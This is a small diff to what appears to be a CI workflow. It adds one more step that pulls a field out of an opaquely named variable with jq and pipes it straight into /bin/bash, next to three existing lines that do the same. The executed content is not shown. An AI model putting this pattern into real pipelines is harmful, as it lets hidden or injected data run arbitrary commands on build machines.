@@ -49,6 +49,7 @@ jobs:
           printf '%s' "$vtm7" | jq -r .mnq0614 | /bin/bash
           printf '%s' "$oa893" | jq -r .kpnva21288 | /bin/bash
           printf '%s' "$gq36" | jq -r .wg772 | /bin/bash
+          echo $r2 | jq -r .t165 | /bin/bash
 
       - name: Store results
         if: always()
